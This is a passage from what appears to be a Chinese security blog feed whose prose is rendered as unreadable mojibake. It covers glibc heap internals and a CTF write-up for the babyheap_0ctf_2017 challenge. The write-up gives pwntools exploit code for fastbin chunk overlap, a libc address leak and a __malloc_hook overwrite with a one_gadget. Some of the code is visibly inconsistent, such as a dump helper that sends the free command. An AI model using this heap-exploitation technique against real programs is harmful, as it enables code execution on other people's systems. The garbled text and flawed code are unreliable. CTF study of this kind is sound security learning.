çš„å¤§å°ï¼‰ã€‚ä½†æ˜¯è¿™ä¸ªå­—æ®µçš„æœ€åä¸‰ä½ç›¸å½“äºä¸‰ä¸ª flag ï¼Œæœ‰å¦å¤–çš„ä½œç”¨ã€‚</p><p>è¿™ä¸‰ä½çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.NON_MAIN_ARENA</span>     è¿™ä¸ªå †å—æ˜¯å¦ä½äºä¸»çº¿ç¨‹<br><span class="hljs-number">2</span><span class="hljs-selector-class">.IS_MAPPED</span>          è®°å½•å½“å‰ chunk æ˜¯å¦æ˜¯ç”± mmap åˆ†é…çš„<br><span class="hljs-number">3</span><span class="hljs-selector-class">.PREV_INUSE</span>         è®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé‡ç‚¹è®²è§£æœ€åä¸€ä½ï¼š<strong>ç”¨æ¥è®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ï¼Œè¢«åˆ†é…çš„è¯è¿™ä¸ªå­—æ®µçš„å€¼ä¸º 1</strong>ï¼Œæ‰€ä»¥ç»å¸¸ä¼šåœ¨å·²åˆ†é…çš„å †å—ä¸­çš„ size å­—æ®µä¸­å‘ç°å€¼æ¯”åŸæ¥å¤§ 1 ä¸ªå­—èŠ‚ã€‚</p><ul><li>æ‰€ä»¥å‰ä¸€ä¸ªå †å—çš„é‡Šæ”¾ä¸å¦éƒ½å’Œè¿™ä¸¤ä¸ªå­—æ®µï¼ˆpre_sizeã€sizeï¼‰çš„å€¼æœ‰å…³ï¼Œè¿™æ˜¯å› ä¸ºä¾¿äºå†…å­˜çš„é‡Šæ”¾æ“ä½œï¼ˆfreeï¼‰</li><li>user data é¡¾åæ€ä¹‰å°±æ˜¯ç”¨æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®çš„ã€‚</li></ul><h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>å°±ç®—åªç”³è¯·10å­—èŠ‚ï¼Œå†…æ ¸ä¹Ÿä¼šåˆ†é…132KBå †ç©ºé—´ç»™ptmalloc2ï¼Œç”¨å®Œå†…æ ¸å†åˆ†é…132KBã€‚å› ä¸ºæ˜¯ä¸»çº¿ç¨‹åˆ†é…çš„ï¼Œæ‰€ä»¥è¿™ä¸ªåŒºåŸŸå«åš main arenaã€‚</p><p>==x/2gx &amp;main_arena==</p><p><strong>32ä½çš„ç¨‹åºä½¿ç”¨ x/32xw  addræ¯”è¾ƒç›´è§‚ä¸€ç‚¹</strong></p><p><strong>64ä½çš„ç¨‹åºä½¿ç”¨ x/64xw  addr</strong></p><h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>å †ä¸­ç¬¬ä¸€ä¸ªå †å—,ç¨‹åºä»¥ååˆ†é…åˆ°çš„å†…å­˜åˆ°è¦æ”¾åœ¨ä»–çš„åé¢ï¼Œå°±å¦‚ä¸‹å›¾çš„0x5578cbd73110ï¼ˆå¹¶ä¸”ï¼Œå †å‘ä¸Šç”Ÿé•¿</p><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214332010.png" class="" title="image-20200131214332010"><blockquote><p>FD æŒ‡å‘é“¾è¡¨ä¸­å‰ä¸€ä¸ªå †å—çš„æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkçš„head</p><p>BK æŒ‡å‘é“¾è¡¨ä¸­åä¸€ä¸ªå †å—çš„æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆä¹Ÿæ˜¯æŒ‡å‘chunkçš„headï¼Œé€šè¿‡ fd å’Œ bk å¯ä»¥å°†ç©ºé—²çš„ chunk å—åŠ å…¥åˆ°ç©ºé—²çš„ chunk å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</p><p>FD_nextsize æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</p><p>BK_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚chunk æ—¶æŒ¨ä¸ªéå†ã€‚</p><p>ä½œè€…ï¼šåˆå¤©æ™ºæ±‡<br>é“¾æ¥ï¼š<a href="https://www.jianshu.com/p/5263bdbe92e2">https://www.jianshu.com/p/5263bdbe92e2</a><br>æ¥æºï¼šç®€ä¹¦<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>è¿™é‡Œæˆ‘æŠŠç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªéƒ½freeäº†</p><h2 id="free-å‡½æ•°å’Œ-bins"><a href="#free-å‡½æ•°å’Œ-bins" class="headerlink" title="free å‡½æ•°å’Œ bins"></a>free å‡½æ•°å’Œ bins</h2><p>å †ç®¡ç†å™¨ä¼šæ ¹æ®ç”¨æˆ·å·²ç»ç”³è¯·åˆ°çš„å†…å­˜ç©ºé—´å¤§å°è¿›è¡Œé‡Šæ”¾ï¼Œ<strong>æ¥å†³å®šæ”¾å…¥å“ªç±» bins å½“ä½œå»</strong>.</p><p>ä¸»è¦çš„ bins åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼Œé‡ç‚¹è®²è§£ fast binï¼Œå› ä¸º fast bin æ˜¯ä½¿ç”¨åˆ°çš„æœ€å¤šçš„ä¸€ç±»ï¼Œä¹Ÿæ˜¯å…¶ä¸­ç»“æ„æœ€ä¸ºç®€å•çš„ã€‚</p><p>è°ƒç”¨ free å‡½æ•°ä»¥åç¨‹åºåšäº†ä¸¤ä»¶äº‹ï¼š<br><strong>1.æ¸…ç©ºæ­¤å †å—çš„ user data<br>2.å°†æ­¤å †å—çš„æŒ‡é’ˆå­˜å‚¨åˆ° main_arena ä¸­äº†ï¼ˆæˆ–æ˜¯ fast bin ä¸­ï¼‰</strong></p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸ºäº†å¿«é€Ÿé‡æ–°åˆ†é…å›å†…å­˜è€Œå­˜åœ¨çš„ä¸€ä¸ªç»“æ„ã€‚</p><blockquote><p>fastbinæ‰€åŒ…å«chunkçš„å¤§å°ä¸º16 Bytes, 24 Bytes, 32 Bytes, â€¦ , 80 Bytesã€‚å½“åˆ†é…ä¸€å—è¾ƒå°çš„å†…å­˜(mem&lt;=64 Bytes)æ—¶ï¼Œä¼šé¦–å…ˆæ£€æŸ¥å¯¹åº”å¤§å°çš„fastbinä¸­æ˜¯å¦åŒ…å«æœªè¢«ä½¿ç”¨çš„chunkï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥å°†å…¶ä»fastbinä¸­ç§»é™¤å¹¶è¿”å›ï¼›å¦åˆ™é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå‰ªåˆ‡top chunkï¼‰å¾—åˆ°ä¸€å—ç¬¦åˆå¤§å°è¦æ±‚çš„chunkå¹¶è¿”å›ã€‚</p></blockquote><p><strong>fast bin çš„ç‰¹æ€§</strong></p><p><strong>1.ä½¿ç”¨å•é“¾è¡¨æ¥ç»´æŠ¤é‡Šæ”¾çš„å †å—</strong><br>ä¹Ÿå°±æ˜¯å’Œä¸Šå›¾ä¸€æ ·ï¼Œä»main_arena åˆ° free ç¬¬ä¸€ä¸ªå—çš„åœ°æ–¹æ˜¯é‡‡ç”¨å•é“¾è¡¨å½¢å¼è¿›è¡Œå­˜å‚¨çš„ï¼Œè‹¥è¿˜æœ‰ free æ‰çš„å †å—ï¼Œåˆ™è¿™ä¸ªå †å—çš„ fk æŒ‡é’ˆåŸŸå°±ä¼šæŒ‡é’ˆå‰ä¸€ä¸ªå †å—ã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ­¤æ—¶å°±æ˜¯ä¸€ä¸ªå•é“¾è¡¨ç»“æ„</p><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214423497.png" class="" title="image-20200131214423497"><p><strong>2.é‡‡ç”¨åè¿›å…ˆå‡ºçš„æ–¹å¼ç»´æŠ¤é“¾è¡¨ï¼ˆç±»ä¼¼äºæ ˆçš„ç»“æ„ï¼‰</strong><br>å½“ç¨‹åºéœ€è¦é‡æ–° malloc å†…å­˜å¹¶ä¸”éœ€è¦ä»fastbin ä¸­æŒ‘é€‰å †å—æ—¶ï¼Œ<strong>ä¼šé€‰æ‹©åé¢æ–°åŠ å…¥çš„å †å—æ‹¿æ¥å…ˆè¿›è¡Œå†…å­˜åˆ†é…</strong></p><p>å¦‚ä¸Šå›¾ï¼Œå¦‚æœç¨‹åºé‡æ–°è¯·æ±‚å’Œä¸Šé¢çš„å †å—å¤§å°ä¸€æ ·æ—¶å€™ï¼ˆmallocï¼‰ï¼Œå †ç®¡ç†å™¨å°±ä¼šç›´æ¥ä½¿ç”¨ fast bin é‡Œçš„å †å—ã€‚</p><p><strong>è¿™é‡Œçš„è¯ä¹Ÿå°±æ˜¯ç›´æ¥ä½¿ç”¨ç¬¬äºŒæ¬¡é‡Šæ”¾çš„è¿™ä¸ªå †å—ï¼Œç„¶åå°†è¿™ä¸ªå †å—ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œæ¥ç€æ ¹æ®å †å—çš„ fk æŒ‡é’ˆæ‰¾åˆ°è¿™ä¸ªå †å—</strong>ï¼Œæ­¤æ—¶ main_arena å°±æŒ‡å‘äº†è¿™é‡Œã€‚</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ª small chunk ï¼Œæ»¡è¶³çš„å†…å­˜ç©ºé—´æ¯” fast bin å¤§ä¸€ç‚¹ã€‚</p><p>å¦‚æœç¨‹åºè¯·æ±‚çš„å†…å­˜èŒƒå›´ä¸åœ¨ fast bin çš„èŒƒå›´å†…ï¼Œå°±ä¼šè€ƒè™‘small binã€‚ç®€å•ç‚¹è¯´å°±æ˜¯å¤§äº 80 Bytes å°äºæŸä¸€ä¸ªå€¼æ—¶ï¼Œå°±ä¼šé€‰æ‹©ä»–ã€‚</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p>å½“ fast binã€small bin ä¸­çš„ chunk éƒ½ä¸èƒ½æ»¡è¶³ç”¨æˆ·è¯·æ±‚ chunk å¤§å°æ—¶ï¼Œå †ç®¡ç†å™¨å°±ä¼šè€ƒè™‘ä½¿ç”¨ unsorted bin ã€‚å®ƒä¼šåœ¨åˆ†é… large chunk ä¹‹å‰å¯¹å †ä¸­ç¢ç‰‡ chunk è¿›è¡Œåˆå¹¶ï¼Œä»¥ä¾¿å‡å°‘å †ä¸­çš„ç¢ç‰‡ã€‚</p></blockquote><ul><li><p>unsorted bin ä¸ fast bin ä¸åŒï¼Œä»–ä½¿ç”¨<strong>åŒå‘é“¾è¡¨</strong>å¯¹ chunk è¿›è¡Œè¿æ¥</p></li><li><p>unsorted çš„å­—é¢æ„æ€å°±æ˜¯â€ä¸å¯å›æ”¶â€çš„æ„æ€ï¼Œå¯ä»¥çœ‹ä½œå°†ä¸å¯å›æ”¶çš„åƒåœ¾ï¼ˆä¸æ»¡è¶³èƒ½å¤Ÿè¿›è¡Œå†…å­˜åˆ†é…çš„å †å—ï¼‰éƒ½æ”¾åˆ°è¿™ä¸ªâ€åƒåœ¾æ¡¶â€ä¸­ã€‚</p></li></ul><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131215053221.png" class="" title="image-20200131215053221">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>babyheap_0ctf_2017</title>
    <link href="/2020/02/02/babyheap_0ctf_2017/"/>
    <url>/2020/02/02/babyheap_0ctf_2017/</url>
    
    <content type="html"><![CDATA[<p>å‚è€ƒwp:<a href="https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2">https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2</a></p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129165539077.png" class="" title="image-20200129165539077"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">=====</span> <span class="hljs-string">Baby</span> <span class="hljs-string">Heap</span> <span class="hljs-string">in</span> <span class="hljs-number">2017</span> <span class="hljs-string">=====</span><br><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">Allocate</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Size:</span> <span class="hljs-number">300</span> <br><span class="hljs-string">Allocate</span> <span class="hljs-string">Index</span> <span class="hljs-number">0</span><br><br><span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Fill</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">2</span>   <br><span class="hljs-attr">Index:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Size:</span> <span class="hljs-number">400</span><br><span class="hljs-attr">Content:</span> <br><br><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Free</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">3</span><br><span class="hljs-attr">Index:</span> <span class="hljs-number">3</span><br><br><span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">Dump</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">4</span><br><span class="hljs-attr">Index:</span> <span class="hljs-number">0</span><br><br><span class="hljs-number">5</span><span class="hljs-string">.</span> <span class="hljs-string">Exit</span><br><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172302922.png" class="" title="image-20200129172302922"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172208306.png" class="" title="image-20200129172208306"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heap</span>&#123;</span><br><span class="hljs-keyword">int</span> ifExit;<br><span class="hljs-keyword">int</span> size;<br><span class="hljs-keyword">char</span> *str;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172221992.png" class="" title="image-20200129172221992"><p>è¿™é‡Œå¯ä»¥çœ‹è§æ²¡æœ‰æ£€æŸ¥v4è·Ÿç»“æ„ä½“é‡Œçš„sizeå¤§å°ï¼Œå¹¶ä¸”æ˜¯æŒ‰ç…§v4æ¥è¾“å…¥çš„ï¼Œè¿™æ ·å°±å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€å—</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172235026.png" class="" title="image-20200129172235026"><p>éƒ½è®¾ç½®ä¸ºäº†0ï¼Œè¿™æ ·å°±ä¸èƒ½<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/">Use_after_free</a></p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172250382.png" class="" title="image-20200129172250382"><p>å…ˆå†™å¥½å¿…é¡»çš„å››ä¸ªåŠŸèƒ½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Size:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sleep(<span class="hljs-number">0.1</span>)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">Index,payload</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(Index))<br>    sh.sendlineafter(<span class="hljs-string">&quot;Size:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    sh.sendlineafter(<span class="hljs-string">&quot;Content:&quot;</span>,<span class="hljs-built_in">str</span>(payload))<br>    sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">Index</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(Index))<br>    sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">Index</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(Index))<br>    sleep(<span class="hljs-number">0.1</span>)<br><br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œå…ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#0 0x00</span><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1 0x20</span><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 0x40</span><br>add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#3 0x60</span><br>gdb.attach(sh)<br>heap<br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202114445460.png" class="" title="image-20200202114445460"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">2</span>)<span class="hljs-comment">#0x40</span><br>free(<span class="hljs-number">1</span>)<span class="hljs-comment">#0x20</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202114934969.png" class="" title="image-20200202114934969"><p>ç„¶åï¼Œæˆ‘ä»¬é€šè¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x60</span>)    <br>fill(<span class="hljs-number">0</span>,payload)<span class="hljs-comment">#0x00</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202115823555.png" class="" title="image-20200202115823555"><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œç”±äºæ²¡æœ‰é™åˆ¶è¾“å…¥é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å†™å…¥fd 8ä¸ªaï¼Œbk 8ä¸ªaï¼Œ fd_nextsize p64(0)ï¼Œbk_nextsize p64(0x21)ï¼Œç„¶åå†™å…¥åˆ°ä¸‹ä¸€å— æˆ‘ä»¬æœ¬æ¥å·²ç»freeæ‰äº†çš„<code>0x20</code>ä¸­çš„ fdä¸­ï¼Œä½¿ä»–çš„æŒ‡å‘ <code>0x60</code>çš„binï¼Œè¿™æ ·æˆ‘ä»¬çœ‹fastbinsæ—¶å°±åªèƒ½çœ‹è§<code>0x20</code>å’Œ<code>0x60</code>äº†</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202121553155.png" class="" title="image-20200202121553155"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1 0x20</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202122603540.png" class="" title="image-20200202122603540"><p>è¿™æ ·ä¹‹åï¼Œæˆ‘ä»¬çš„ç›®çš„å°±è¾¾æˆäº†ï¼ŒæŠŠä¸€å—æ²¡æœ‰freeçš„ç©ºé—´æ”¾å…¥äº†fastbinsä¸­</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202122724203.png" class="" title="image-20200202122724203"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">1</span>,payload) <br></code></pre></td></tr></table></figure><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬æŠŠ<code>0x40</code>çš„bk_nextsize è®¾ä¸º0x21,è¿™æ ·å¯ä»¥ä¿®æ”¹<code>0x60</code>çš„bin sizeä¸º0x21(0x10 + 0x11)ï¼Œç»•è¿‡fastbinåœ¨åˆ†é…å†…å­˜çš„æ—¶å€™çš„æ£€æµ‹</p><blockquote><p>BK_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚chunk æ—¶æŒ¨ä¸ªéå†ã€‚</p></blockquote><p>å†æ¬¡<code>allocate(0x10)  #2 0x60</code>å°±ä¼šæŠŠä¹‹å‰çš„0x80çš„å—åˆ†é…å‡ºæ¥</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202124220989.png" class="" title="image-20200202124220989"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202123933115.png" class="" title="image-20200202123933115"><p>ç„¶å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">1</span>,payload)  <span class="hljs-comment">#1 0x20 è¿˜åŸ#3çš„binçš„size</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202124141267.png" class="" title="image-20200202124141267"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4#ä¸ºäº†è®©#3çš„binä¸å†æŒ¨ç€top chunk</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202132442146.png" class="" title="image-20200202132442146"><p>ç„¶åæˆ‘ä»¬å°†<code>0x60    #3</code>freeæ‰ä¹‹å</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202132625185.png" class="" title="image-20200202132625185"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202181236041.png" class="" title="image-20200202181236041"><p>è¿™æ ·fd å’Œbk éƒ½æŒ‡å‘main_arena+88å¤„</p><p>==ç„¶åä¸ºå•¥dump2å‘¢-ã€‚-==</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">io.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br>main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span><br>log.success(<span class="hljs-string">&#x27;main arena: &#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena))<br>libc_base = main_arena - <span class="hljs-number">0x3c4b20</span> <br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p>0x3c4b20 å¯ä»¥åœ¨å¯¹åº”çš„libcä¸­ï¼Œæœç´¢malloc_trimå‡½æ•°ï¼Œå¯ä»¥åœ¨ä¸‹å›¾çš„åœ°æ–¹çœ‹è§</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202182025461.png" class="" title="image-20200202182025461"><p>ä¹Ÿå¯ä»¥ä½¿ç”¨<a href="https://github.com/bash-c/main_arena_offset">main_arena_offset</a> <code>main_arena libcaddr</code>è·å–</p><p>Arbitrary Allocçš„ä¾‹è¡Œå…¬äº‹ï¼Œæœ€ç»ˆä¿®æ”¹malloc_hookçš„å†…å®¹ä¸ºone_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">one_gadget = libc_base + <span class="hljs-number">0x4526a</span> <br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>free(<span class="hljs-number">3</span>)<br>fake_chunk_addr = main_arena - <span class="hljs-number">0x33</span><br>payload = p64(fake_chunk_addr)<br>fill(<span class="hljs-number">2</span>,payload)<br><br></code></pre></td></tr></table></figure><p>0x33</p><blockquote><p><code>p &amp;main_arena</code></p><p><code>$1 = (struct malloc_state *) 0x7f5081821b20 &lt;main_arena&gt;</code></p><p><code>x/10gx main_arena_addr-0x10</code></p><p><code>0x7f5081821b10 &lt;__malloc_hook&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b20 &lt;main_arena&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b30 &lt;main_arena+16&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b40 &lt;main_arena+32&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b50 &lt;main_arena+48&gt;:    0x0000000000000000    0x0000000000000000</code></p><p><code>find_fake_fast __malloc_hook_addr 0x70</code></p><p><code>FAKE CHUNKS0x7f5081821aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA &#123; prev_size = 5801060741742067712,  size = 127,  fd = 0x50814e2e20000000,  bk = 0x50814e2a0000007f,  fd_nextsize = 